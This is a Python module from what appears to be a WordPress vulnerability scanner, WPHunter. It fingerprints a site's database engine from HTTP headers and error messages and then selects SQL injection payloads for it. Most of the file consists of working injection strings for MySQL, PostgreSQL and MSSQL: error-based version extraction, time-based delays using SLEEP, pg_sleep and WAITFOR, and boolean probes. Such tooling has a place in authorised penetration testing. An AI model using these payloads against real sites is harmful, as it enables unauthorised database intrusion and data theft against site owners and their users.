"""
WPHunter - DBMS Detection & Smart Payload Selection
===================================================
Detect database management system and select appropriate payloads.
"""

import re
from typing import Dict, List, Optional
from enum import Enum

from core.logger import logger


class DBMS(Enum):
    """Supported database management systems."""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    SQLITE = "sqlite"
    ORACLE = "oracle"
    UNKNOWN = "unknown"


class DBMSDetector:
    """
    Detect DBMS from HTTP headers, error messages, and responses.
    """
    
    # Header-based detection
    HEADER_SIGNATURES = {
        DBMS.MYSQL: [
            r"mysql",
            r"mariadb",
        ],
        DBMS.POSTGRESQL: [
            r"postgres",
            r"pgsql",
        ],
        DBMS.MSSQL: [
            r"microsoft.*sql",
            r"mssql",
        ],
        DBMS.ORACLE: [
            r"oracle",
        ],
    }
    
    # Error message signatures
    ERROR_SIGNATURES = {
        DBMS.MYSQL: [
            r"You have an error in your SQL syntax",
            r"mysql_fetch",
            r"mysql_num_rows",
            r"MySQL server version",
            r"supplied argument is not a valid MySQL",
        ],
        DBMS.POSTGRESQL: [
            r"PostgreSQL.*ERROR",
            r"pg_query",
            r"pg_exec",
            r"unterminated quoted string",
        ],
        DBMS.MSSQL: [
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"Unclosed quotation mark",
        ],
        DBMS.SQLITE: [
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite",
        ],
        DBMS.ORACLE: [
            r"ORA-\d{5}",
            r"Oracle error",
            r"Oracle.*Driver",
        ],
    }
    
    @classmethod
    def detect_from_headers(cls, headers: Dict[str, str]) -> DBMS:
        """Detect DBMS from HTTP headers."""
        headers_str = " ".join([f"{k}: {v}" for k, v in headers.items()]).lower()
        
        for dbms, patterns in cls.HEADER_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, headers_str, re.IGNORECASE):
                    logger.info(f"DBMS detected from headers: {dbms.value}")
                    return dbms
        
        return DBMS.UNKNOWN
    
    @classmethod
    def detect_from_error(cls, error_text: str) -> DBMS:
        """Detect DBMS from error message."""
        for dbms, patterns in cls.ERROR_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, error_text, re.IGNORECASE):
                    logger.info(f"DBMS detected from error: {dbms.value}")
                    return dbms
        
        return DBMS.UNKNOWN
    
    @classmethod
    def detect_from_response(cls, response_text: str, headers: Dict[str, str]) -> DBMS:
        """Detect DBMS from full response."""
        # Try headers first
        dbms = cls.detect_from_headers(headers)
        if dbms != DBMS.UNKNOWN:
            return dbms
        
        # Try error messages
        dbms = cls.detect_from_error(response_text)
        if dbms != DBMS.UNKNOWN:
            return dbms
        
        # Default to MySQL for WordPress (most common)
        logger.debug("DBMS unknown, defaulting to MySQL")
        return DBMS.MYSQL


class SmartPayloadSelector:
    """
    Select optimal payloads based on detected DBMS.
    """
    
    # MySQL-specific payloads
    MYSQL_PAYLOADS = {
        "error_based": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)y)--",
            "' UNION SELECT NULL,CONCAT(0x7e,VERSION(),0x7e)--",
        ],
        "time_based": [
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(5000000,MD5('test'))--",
            "' OR IF(1=1,SLEEP(5),0)--",
        ],
        "boolean": [
            "' AND '1'='1",
            "' AND ASCII(SUBSTRING(VERSION(),1,1))>52--",
        ],
    }
    
    # PostgreSQL-specific payloads
    POSTGRESQL_PAYLOADS = {
        "error_based": [
            "' AND 1=CAST((SELECT version()) AS int)--",
            "' UNION SELECT NULL,version()--",
        ],
        "time_based": [
            "' AND pg_sleep(5)--",
            "' OR (SELECT 1 FROM pg_sleep(5))--",
        ],
        "boolean": [
            "' AND '1'='1",
            "' AND SUBSTRING(version(),1,1)='P'--",
        ],
    }
    
    # MSSQL-specific payloads
    MSSQL_PAYLOADS = {
        "error_based": [
            "' AND 1=CONVERT(int,@@version)--",
            "' UNION SELECT NULL,@@version--",
        ],
        "time_based": [
            "' WAITFOR DELAY '00:00:05'--",
            "' OR WAITFOR DELAY '00:00:05'--",
        ],
        "boolean": [
            "' AND '1'='1",
            "' AND SUBSTRING(@@version,1,1)='M'--",
        ],
    }
    
    @classmethod
    def get_payloads(cls, dbms: DBMS, payload_type: str = "error_based") -> List[str]:
        """
        Get optimal payloads for detected DBMS.
        
        Args:
            dbms: Detected DBMS
            payload_type: Type of payload (error_based, time_based, boolean)
        
        Returns:
            List of payloads optimized for the DBMS
        """
        if dbms == DBMS.MYSQL:
            return cls.MYSQL_PAYLOADS.get(payload_type, [])
        elif dbms == DBMS.POSTGRESQL:
            return cls.POSTGRESQL_PAYLOADS.get(payload_type, [])
        elif dbms == DBMS.MSSQL:
            return cls.MSSQL_PAYLOADS.get(payload_type, [])
        else:
            # Default to MySQL (most common for WordPress)
            return cls.MYSQL_PAYLOADS.get(payload_type, [])
    
    @classmethod
    def get_all_payloads(cls, dbms: DBMS) -> Dict[str, List[str]]:
        """Get all payload types for DBMS."""
        if dbms == DBMS.MYSQL:
            return cls.MYSQL_PAYLOADS
        elif dbms == DBMS.POSTGRESQL:
            return cls.POSTGRESQL_PAYLOADS
        elif dbms == DBMS.MSSQL:
            return cls.MSSQL_PAYLOADS
        else:
            return cls.MYSQL_PAYLOADS
